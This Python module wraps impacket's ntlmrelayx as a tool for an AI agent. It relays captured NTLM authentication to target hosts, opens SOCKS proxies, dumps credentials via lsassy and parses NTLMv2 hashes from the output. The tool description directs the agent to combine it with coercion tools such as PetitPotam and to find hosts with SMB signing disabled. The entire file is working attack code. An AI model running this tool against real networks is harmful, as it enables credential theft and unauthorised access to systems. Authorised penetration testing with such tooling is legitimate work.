"""
NTLM relay attacks via impacket's ntlmrelayx.py.
Starts a relay server, listens for incoming NTLM auth,
and relays to one or more targets for a specified duration.
"""
import re
import shlex
import shutil
import subprocess
import tempfile
import threading
import time
import os
from typing import Optional


def impacket_ntlmrelay(targets: str, action: str = "smb", listen_ip: Optional[str] = None,
                        timeout: int = 60, smb2support: bool = True,
                        flags: Optional[str] = None) -> dict:
    binary = shutil.which("ntlmrelayx.py") or shutil.which("impacket-ntlmrelayx")
    if not binary:
        return {"error": "ntlmrelayx.py not found. Install impacket."}

    with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
        # targets can be comma-separated or a single target
        for t in targets.split(","):
            f.write(t.strip() + "\n")
        target_file = f.name

    cmd = [binary, "-tf", target_file, "-smb2support"]

    if action == "socks":
        cmd.append("-socks")
    elif action == "dump":
        cmd += ["--no-http-server", "-i"]
    elif action == "lsassy":
        cmd += ["-c", "lsassy"]
    # default: smb relay

    if listen_ip:
        cmd += ["--lm", listen_ip]

    if not smb2support and "-smb2support" in cmd:
        cmd.remove("-smb2support")

    if flags:
        cmd += shlex.split(flags)

    results: list = []
    output_lines: list = []

    def _reader(proc):
        for line in iter(proc.stdout.readline, ""):
            output_lines.append(line.rstrip())
            # Capture successful relay events
            if any(kw in line for kw in ["SUCCEED", "Authenticating", "Executed", "NTLM", "hash"]):
                results.append(line.rstrip())

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        t = threading.Thread(target=_reader, args=(proc,), daemon=True)
        t.start()
        time.sleep(timeout)
        proc.terminate()
        t.join(timeout=5)
    except Exception as e:
        return {"error": str(e), "_command": " ".join(cmd)}
    finally:
        try:
            os.unlink(target_file)
        except Exception:
            pass

    full_output = "\n".join(output_lines)
    captures = _parse_captures(full_output)

    return {
        "action":        action,
        "targets":       targets,
        "timeout":       timeout,
        "captures":      captures,
        "count":         len(captures),
        "relay_events":  results[:20],
        "raw":           full_output[:8000],
        "_command":      " ".join(cmd),
    }


def _parse_captures(output: str) -> list:
    captures: list = []

    for line in output.splitlines():
        # Hash captures
        hash_m = re.search(r"([\w]+)::([\w.-]+):([a-f0-9]+):([a-f0-9]+):([a-f0-9]+)", line)
        if hash_m:
            captures.append({
                "type":     "NTLMv2 hash",
                "user":     hash_m.group(1),
                "domain":   hash_m.group(2),
                "hash":     f"{hash_m.group(1)}::{hash_m.group(2)}:{hash_m.group(3)}:{hash_m.group(4)}:{hash_m.group(5)}",
            })

        # Successful relay
        if "SUCCEED" in line or "AUTHENTICATED" in line.upper():
            captures.append({"type": "relay_success", "line": line[:200]})

        # Command execution
        if "Executed" in line or "exec" in line.lower():
            captures.append({"type": "exec", "line": line[:200]})

    return captures


TOOL_DEFINITION = {
    "name": "impacket_ntlmrelay",
    "description": (
        "NTLM relay attack server via impacket's ntlmrelayx. "
        "Listens for incoming NTLM authentication (triggered by coercion tools like petitpotam/coercer) "
        "and relays credentials to one or more target systems.\n"
        "actions:\n"
        "- 'smb': relay to SMB target — attempt command execution or file access\n"
        "- 'socks': open SOCKS proxy for relayed sessions\n"
        "- 'lsassy': relay to SMB and dump credentials via lsassy\n"
        "targets: comma-separated IPs or hostnames to relay to.\n"
        "timeout: seconds to listen for relayed connections (default 60).\n"
        "IMPORTANT: This tool requires incoming NTLM auth — use with petitpotam or coercer to trigger it. "
        "Also requires SMB signing disabled on targets (verify with netexec smb --gen-relay-list)."
    ),
    "input_schema": {
        "type": "object",
        "properties": {
            "targets":     {"type": "string", "description": "Comma-separated target IPs/hostnames to relay to"},
            "action":      {"type": "string", "description": "'smb', 'socks', 'lsassy'. Default: smb"},
            "listen_ip":   {"type": "string", "description": "IP address to listen on (default: all interfaces)"},
            "timeout":     {"type": "integer", "description": "Seconds to listen for connections. Default: 60"},
            "smb2support": {"type": "boolean", "description": "Enable SMBv2 support. Default: true"},
            "flags":       {"type": "string", "description": "Additional ntlmrelayx flags"},
        },
        "required": ["targets"],
    },
}
